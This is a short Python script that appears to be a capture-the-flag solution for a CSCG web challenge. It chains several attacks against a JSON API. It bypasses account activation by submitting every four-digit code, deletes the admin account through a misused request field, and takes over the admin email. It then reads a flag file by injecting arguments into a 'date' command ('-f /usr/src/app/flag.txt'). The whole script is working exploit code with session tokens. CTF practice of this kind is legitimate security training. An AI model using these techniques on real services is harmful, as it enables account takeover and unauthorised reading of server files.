import requests

# Step 1: Activation

'''
all_codes = ""
for i in range(0, 10000):
    all_codes += f"{i:04d}"

activation_data = {"action":"create_account","data":{"email":"test@test.de","password":"testtest","groupid":"e10","userid":"    ","activation":all_codes}}

activation_resp = requests.post("https://517f90cd90924faad33444cf-cybercrime-society-club-germany.challenge.master.cscg.live:31337/json_api", json=activation_data)
print(activation_resp.text)
'''

# Step 2: Delete admin and own user account
# Auth string from burp
'''
auth = {"auth":"fd5eeae8-8b3a-452a-8091-f6d22707cc78"}
delete_admin = {"action":"delete_account","data":{"email":"test@test.de","other_field":"admin@cscg.de"}}
delete_admin_resp = requests.post("https://517f90cd90924faad33444cf-cybercrime-society-club-germany.challenge.master.cscg.live:31337/json_api", json=delete_admin, cookies=auth)
print(delete_admin_resp.text)
'''

# Step 3: Create again account (see step 1)

# Step 4: Change user email to admin@cscg.de (manually via webbrowser, to lazy to code)

# Step 4: File read via date
# Auth string from burp
auth = {"auth":"93dd9e42-4c0b-4fde-8e6a-87a8765481c6"}
file_read_data = {"action":"admin","data":{"cmd":["date", "-f","/usr/src/app/flag.txt", "+"]}}
file_read_resp = requests.post("https://517f90cd90924faad33444cf-cybercrime-society-club-germany.challenge.master.cscg.live:31337/json_api", json=file_read_data, cookies=auth)
print(file_read_resp.text)